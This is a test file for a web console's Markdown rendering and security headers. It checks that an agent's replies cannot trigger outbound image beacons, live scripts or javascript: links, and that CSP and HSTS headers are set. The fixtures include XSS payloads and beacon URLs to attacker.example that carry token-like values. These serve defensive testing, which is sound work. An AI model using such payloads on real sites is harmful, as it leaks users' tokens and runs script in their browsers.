import assert from "node:assert/strict";
import { test } from "node:test";
import { readFileSync } from "node:fs";
import { contentSecurityPolicy, SECURED_PATHS, securityHeaders } from "../src/lib/security/csp.ts";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import { imageDecision, isInlineImage, markdownUrlTransform, SafeImage } from "../src/lib/shared/markdown-image.ts";

// Review: an agent's Markdown must not make the owner's browser call
// out. Pure: the image decision and the page headers.

test("an agent's Markdown image is shown only inline; any URL, the Console's own included, becomes text", () => {
  // The decision no longer looks at the page's origin; called the way the
  // component once called it (with the origin), it must still refuse it.
  const withOrigin = imageDecision as unknown as (src: unknown, alt: unknown, origin: string) => ReturnType<typeof imageDecision>;
  for (const own of ["/api/auth/github?n=1", "https://squadroom.example/api/auth/callback"]) assert.equal(withOrigin(own, "x", "https://squadroom.example").show, false, own);
  assert.deepEqual(imageDecision("data:image/png;base64,iVBORw0KGgo=", "icon"), { show: true, src: "data:image/png;base64,iVBORw0KGgo=" });
  assert.equal(imageDecision("data:image/gif;base64,R0lGOD", "x").show, true);
  // A beacon, the Console's own routes (an image request carries the
  // owner's cookies: a sign-in start would burn its rate limit and replace
  // the sign-in state), a protocol-relative URL, another scheme, a data URL
  // that is not an image: text, with the URL shown.
  for (const src of [
    "https://attacker.example/p?t=sk-ant-oat01-xxx",
    "/api/auth/github?n=1",
    "/api/auth/callback",
    "https://squadroom.example/api/console/file?x=1",
    "/console/sw.js",
    "//attacker.example/p",
    "ftp://squadroom.example/p",
    "data:text/html;base64,PHNjcmlwdD4=",
    "javascript:alert(1)",
  ]) {
    const decision = imageDecision(src, "alt text");
    assert.equal(decision.show, false, src);
    assert.equal((decision as { text: string }).text, `[Image: alt text (${src})]`);
  }
  assert.deepEqual(imageDecision(undefined, undefined), { show: false, text: "[Image: image]" });
  // What the Markdown URL transform lets through for an image's source.
  assert.equal(isInlineImage("data:image/png;base64,iVBORw0KGgo="), true);
  for (const bad of ["data:text/html;base64,PHNjcmlwdD4=", "data:image/svg+xml,<svg/>", "https://a.example/x.png", 3, ""]) assert.equal(isInlineImage(bad), false, String(bad));
  assert.match((imageDecision(`https://a.example/${"x".repeat(300)}`, "") as { text: string }).text, /…\)\]$/);
});

test("an agent's reply rendered as Markdown: raw HTML is text, scripts and handlers never become live, URL images are placeholders, inline images show", () => {
  // Markdown.tsx's options (the .tsx itself, with its CSS import, cannot
  // load under node --test): the same transform and image component.
  const render = (markdown: string, fileLinks: boolean) =>
    renderToStaticMarkup(createElement(ReactMarkdown, { remarkPlugins: [remarkGfm], urlTransform: markdownUrlTransform(fileLinks), components: { img: SafeImage } }, markdown));
  const reply = [
    "<script>alert(1)</script>",
    "",
    'Look: <img src=x onerror="alert(2)"> and <a href="https://attacker.example">here</a>',
    "",
    "[click](javascript:alert(3)) [mail](JAVASCRIPT:alert(4))",
    "",
    "![beacon](http://attacker.example/p.png?t=secret) ![own](/api/auth/github)",
    "",
    "![dot](data:image/png;base64,iVBORw0KGgo=)",
  ].join("\n");
  for (const fileLinks of [false, true]) {
    const html = render(reply, fileLinks);
    // Raw HTML arrives escaped, as text.
    assert.ok(html.includes("&lt;script&gt;alert(1)&lt;/script&gt;"), html);
    assert.ok(html.includes("&lt;img src=x onerror=&quot;alert(2)&quot;&gt;") || html.includes('&lt;img src=x onerror="alert(2)"&gt;'), html);
    assert.doesNotMatch(html, /<script|<img[^>]*onerror|<a href="https:\/\/attacker/i);
    assert.doesNotMatch(html, /href="javascript:/i);
    assert.doesNotMatch(html, /javascript:/i);
    // Only the inline image is an <img>; the URLs are text.
    assert.deepEqual([...html.matchAll(/<img [^>]*>/g)].map((m) => m[0]), ['<img src="data:image/png;base64,iVBORw0KGgo=" alt="dot"/>']);
    assert.ok(html.includes("<span>[Image: beacon (http://attacker.example/p.png?t=secret)]</span>"), html);
    assert.ok(html.includes("<span>[Image: own (/api/auth/github)]</span>"), html);
    assert.doesNotMatch(html, /<link/);
  }
  // `file:` links survive only for a link handler (the Console's file panel).
  assert.match(render("[f](file:README.md)", true), /href="file:README.md"/);
  assert.match(render("[f](file:README.md)", false), /href=""/);
});

test("the Console and sign-in pages carry a Content-Security-Policy, HSTS and nosniff, and send no referrer", () => {
  const production = contentSecurityPolicy(false);
  for (const directive of ["default-src 'self'", "img-src 'self' data:", "connect-src 'self'", "frame-ancestors 'none'", "font-src 'self'", "object-src 'none'", "base-uri 'self'", "form-action 'self'"])
    assert.ok(production.split("; ").includes(directive), directive);
  assert.doesNotMatch(production, /unsafe-eval|ws:/);
  // Only what the page cannot run without: inline scripts and styles.
  assert.match(production, /script-src 'self' 'unsafe-inline'(;|$)/);
  assert.match(production, /style-src 'self' 'unsafe-inline'(;|$)/);
  // Development adds the hot-reload socket and eval, nothing else.
  const dev = contentSecurityPolicy(true);
  assert.match(dev, /script-src 'self' 'unsafe-inline' 'unsafe-eval'/);
  assert.match(dev, /connect-src 'self' ws: wss:/);
  assert.equal(dev.replace(" 'unsafe-eval'", "").replace(" ws: wss:", ""), production);
  assert.deepEqual(securityHeaders(false), [
    { key: "Content-Security-Policy", value: production },
    { key: "Referrer-Policy", value: "no-referrer" },
    { key: "Strict-Transport-Security", value: "max-age=31536000" },
    { key: "X-Content-Type-Options", value: "nosniff" },
  ]);
  // Development differs only in the policy.
  assert.deepEqual(securityHeaders(true).slice(1), securityHeaders(false).slice(1));
  assert.deepEqual(SECURED_PATHS, ["/:path*"]);
});

test("review: the request gate covers Next's image optimizer, which is off; only the build's files and the icon skip it", () => {
  // Next reads both from the files themselves (the matcher must be a
  // literal), so this checks the text.
  const proxy = readFileSync("src/proxy.ts", "utf8");
  const matcher = /matcher: \["(.+)"\]/.exec(proxy)?.[1];
  assert.ok(matcher, "one matcher");
  const gated = new RegExp(`^${JSON.parse(`"${matcher}"`)}$`);
  for (const path of ["/_next/image", "/_next/image?url=%2Fx.png&w=64&q=75", "/x.png", "/console/a.svg", "/login", "/api/auth/github", "/_next/staticx"])
    assert.ok(gated.test(path.split("?")[0]), path);
  for (const path of ["/_next/static/chunks/main.js", "/_next/static/media/font.woff2", "/favicon.ico"])
    assert.ok(!gated.test(path), path);
  const config = readFileSync("next.config.ts", "utf8");
  assert.match(config, /images: \{ unoptimized: true \}/);
  assert.match(config, /poweredByHeader: false/);
});
